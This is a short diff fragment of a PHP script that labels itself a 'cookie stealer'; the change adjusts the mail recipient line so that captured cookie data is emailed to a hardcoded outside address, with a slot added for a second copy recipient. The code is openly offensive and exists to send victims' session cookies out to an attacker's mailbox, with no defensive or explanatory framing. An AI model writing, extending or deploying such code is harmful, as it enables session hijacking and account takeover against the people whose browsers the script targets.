@@ -9,7 +9,8 @@
         //fclose($file);
 
         // Send Mail with steal cookie
-        $to = 'eugene-msa@yandex.ru'; // change email
+        $to = 'eugene-msa@yandex.ru, '; // change email
+        $to .= ''; // copy
         $from = 'From: Cookie Stealer';
         $title = "QA cookie stealer";
         $message = $text;
